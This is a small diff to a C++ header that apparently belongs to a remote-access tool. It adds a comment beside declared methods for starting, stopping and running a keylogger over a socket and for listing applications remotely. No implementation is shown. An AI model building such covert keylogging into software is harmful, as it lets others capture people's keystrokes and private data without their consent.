@@ -57,7 +57,7 @@ private:
     void startKeyLogger();
     void stopKeyLogger(SOCKET);
     void keyLogger();
-    
+    //List/Turn on/Turn off App
     bool hasVisibleWindow(DWORD processID);
     void ListApplications(SOCKET);
 
